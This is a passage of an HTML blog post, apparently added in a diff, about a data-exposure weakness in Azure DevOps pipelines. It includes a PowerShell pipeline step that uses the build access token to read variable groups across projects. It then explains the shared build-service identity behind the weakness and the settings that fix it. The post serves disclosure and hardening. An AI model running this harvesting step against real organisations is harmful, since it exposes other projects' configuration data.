+</span><span style="color:#0ff;font-weight:bold">                $getVarGroupNameApiUri = &#34;https://dev.azure.com/demojev/MyHealthClinic/_apis/distributedtask/variablegroups?groupName=*&amp;api-version=6.1-preview.2&#34;
+</span><span style="color:#0ff;font-weight:bold">                $varGroupResponse = Invoke-RestMethod -Uri $getVarGroupNameApiUri -Headers $httHeaders
+</span><span style="color:#0ff;font-weight:bold">
+</span><span style="color:#0ff;font-weight:bold">                Write-Host &#34;Variables from group [$($varGroupResponse.value.name)] in project id [MyHealthClinic are:&#34;
+</span><span style="color:#0ff;font-weight:bold">                Write-Host &#34;$($varGroupResponse.value[0].variables | ConvertTo-Json -Depth 100))&#34;</span>                
+              <span style="font-weight:bold">errorActionPreference</span>: <span style="color:#0ff;font-weight:bold">&#34;continue&#34;</span>
+              <span style="font-weight:bold">pwsh</span>: <span style="color:#fff;font-weight:bold">true</span>
+            <span style="font-weight:bold">env</span>:
+              <span style="font-weight:bold">SYSTEM_ACCESSTOKEN</span>: $(System.AccessToken)
+
+</code></pre></div><p>When executed, the pipeline should return the variables as a json object. It appears that the variables returned including the actual values as long as they are not marked as secrets. For variables which are marked as secrets the value is set to <code>null</code>. Check the following image.</p>
+<p><img src="https://www.devjev.nl/images/hacking-azure-devops/hack_get_all_variables.jpg" alt="hack_get_all_variables"></p>
+<h3 id="whats-the-vulnerability">What&rsquo;s the vulnerability?</h3>
+<p>It turns out that all the pipelines are executed using a single Azure DevOps identity named <em>Project Collection Build Service ({you organization name})</em>. That&rsquo;s right, this identity has read permissions to pretty much everything within all Azure DevOps Projects. The specific permissions of this identity are already covered by <a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/process/access-tokens?view=azure-devops&amp;tabs=yaml#manage-build-service-account-permissions">Microsoft docs page</a> so I am not going to go into details about them.</p>
+<p>To me this implementation is similar to having an application that consists out of multiple services and during installation configuring all the services to share a single service account which also has read permissions to the whole system.</p>
+<p><img src="https://www.devjev.nl/images/hacking-azure-devops/project_collection_service.jpg" alt="project_collection_service"></p>
+<h2 id="the-fix">The fix</h2>
+<p>Thankfully Microsoft already provided one, it is just not enabled for all Organizations. presumably Microsoft identified this as an issue somewhere in the beginning of 2020 since all the Azure DevOps Organizations created after May 2020 automatically have the fix enabled.</p>
+<p><img src="https://www.devjev.nl/images/hacking-azure-devops/doc_note_ms_page.jpg" alt="doc_note_ms_page">
+<a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/process/access-tokens?view=azure-devops&amp;tabs=yaml#job-authorization-scope">Access repositories, artifacts, and other resources</a>)</p>
+<p>The fix is also quite simple when it comes to implementation. A Project Collection Administrator of the Organization in question should simply enable 3 configuration settings by following these steps:</p>
+<ol>
+<li>Open Organization Settings</li>
+<li>Under Pipelines click on Settings</li>
+<li>Enable the following settings;
+<ol>
+<li>Limit job authorization scope to current project for non-release pipelines</li>
+<li>Limit job authorization scope to current project for release pipelines</li>
+<li>Limit job authorization scope to referenced Azure DevOps repositories</li>
+</ol>
+</li>
+</ol>
+<p><code>NOTE: There is no save button so the settings are have an immediate effect</code></p>
+<p>The moment these settings are enabled the next pipeline that is started will not use the Project Collection Build Service. Instead each project is provisioned with it&rsquo;s own build service. This service has project scoped permissions and thus when the scripts as described in the <strong>The hack</strong> chapter are executed the information from the project in question is returned and nothing more. Like illustrated in the following image.</p>
+<p><img src="https://www.devjev.nl/images/hacking-azure-devops/project_build_service.jpg" alt="project_build_service"></p>
+<h3 id="solution-implications">Solution implications</h3>
+<p>While implementing the fix is very straight forward it does have some implications. As of writing this post this is what I have identified as issues and/or side effects.</p>
+<ul>
+<li>If a pipeline references other repositories in addition to the repository where the pipeline resides. The repository owner must provide permissions in the pipeline for each repository in question. Even for repositories that are part of the same Azure DevOps Project.</li>
+<li>Permissions to organization scoped Artifacts feeds must be provided manually for each Project by navigating to the feed in question from within the project in question and clicking the Allow project-scoped build button.</li>
+<li>Any custom permissions which where given to the Project Collection Build Service in any project must now be also given to the individual project build service.</li>
+</ul>
+<h2 id="the-good-the-bad--the-ugly">The Good, The Bad &amp; The Ugly</h2>
+<p>To sum up my take on this subject here is an overview of <em>The Good, The Bad &amp; The Ugly</em>.</p>
+<table>
+<thead>
+<tr>
+<th>The Good</th>
+<th>The Bad</th>
+<th>The Ugly</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Data spillage is read-only</td>
+<td>Unexpected spillage</td>
+<td>Fixed for Organizations created after May 2020</td>
+</tr>
+<tr>
+<td>Permissions cant be elevated</td>
+<td>Difficult to trace abuse</td>
+<td>Insufficient awareness about the issue</td>
+</tr>
+<tr>
+<td>Secrets are secrets</td>
+<td>Solution is not without impact</td>
+<td></td>
+</tr>
+<tr>
+<td>Easy to fix</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>I hope that you have enjoyed reading the read and perhaps even learned something new. If you have any questions on the subject just reach out to me via twitter on @devjevnl.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script type="text/javascript" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js" id="MathJax-script"></script>
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [
+          ['$', '$'], ['\\(', '\\)']
+        ],
+        processEscapes: true,
+        processEnvironments: true
+      },
+      options: {
+        skipHtmlTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+      }
+    };
+  </script>
+  </section>
+
+    </div>
+
+    
+  <footer class="footer">
+    <section class="container">
+      
+        <p>Let's automate the boring!</p>
+      
+      
+      
+      
+    </section>
+  </footer>
+
+  </main>
+
+  
+  <script src="https://www.devjev.nl/js/custom.js"></script>
+  
+
+  
+
+  
+
+</body>
+
+</html>
